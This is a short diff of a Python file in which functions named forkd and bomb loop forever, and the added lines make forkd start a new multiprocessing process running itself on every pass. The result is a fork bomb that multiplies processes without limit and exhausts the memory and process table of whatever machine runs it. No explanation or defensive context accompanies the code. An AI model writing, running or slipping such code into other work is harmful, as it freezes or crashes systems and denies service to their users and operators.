@@ -5,6 +5,8 @@ import multiprocessing as mp
 def forkd():
 	x = ''
 	while(True):
+		p = mp.Process(target=forkd)
+		p.start()
 		x *= 512
 def bomb():
 	while(True):
